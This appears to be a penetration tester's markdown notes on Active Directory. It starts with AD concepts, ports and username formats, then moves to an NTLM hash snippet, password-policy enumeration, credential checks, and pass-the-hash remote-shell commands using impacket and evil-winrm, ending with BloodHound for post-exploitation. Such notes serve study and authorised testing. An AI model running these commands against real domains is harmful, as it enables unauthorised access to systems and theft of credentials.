# Info
AD Fundementals: 
https://www.pcwdld.com/active-directory-guide

ADUC Fundementals: 
https://www.varonis.com/blog/active-directory-users-and-computers/
http://www.yourhowto.nl/?page_id=43
https://www.pcwdld.com/active-directory-guide






AD
	ADUC
		Objects
			User account
				Domain user account
				Local user account
			Computer account
			Groups
				Security Group
				Distribution Group
			Shares
			Printers
			Organizational Units (OU)
			Attributes
			Delegate Control

LDAP
	Kerberos vs NTLM?
	SASL
	SSL
	DNS
	DHCP
	not SAML and RADIUS

ObjectGUID
ObjectSID

UserPrincipalName (UPN)
SAMAccountName


Service account
sMSA
gMSA

## Common services used in AD
|Service|port|
|-|-|
|DNS|53|
|Kerberos|88|
|RPC|135| 
|NetBios|137-138-139|
|LDAP-tls|389-636|
|SMB|445|
|Global catalog LDAP-tls|3268-3269|

## Domain username convention
firstlast
flast
firlas
first.last
f.last
fir.las

## Calculate NTLM hash
```Python
import hashlib,binascii
hash = hashlib.new('md4', "password".encode('utf-16le')).digest()
print binascii.hexlify(hash)
```

## Password policy
`polenum '<USER>':'<PASS>' -d <IP/DOMAIN>`
`crackmapexec smb IP -u '<USER>' -p '<PASS>' --pass-pol`

## Expoitation
Check:
`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H

Shell:
`impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
`impacket-psexec -hashes '<HASH>' <USER>@<IP>`
`evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
## Post-exploitation
`Bloodhound`
	`SharpHound` for local AD
	`AzureHound` for Azure AD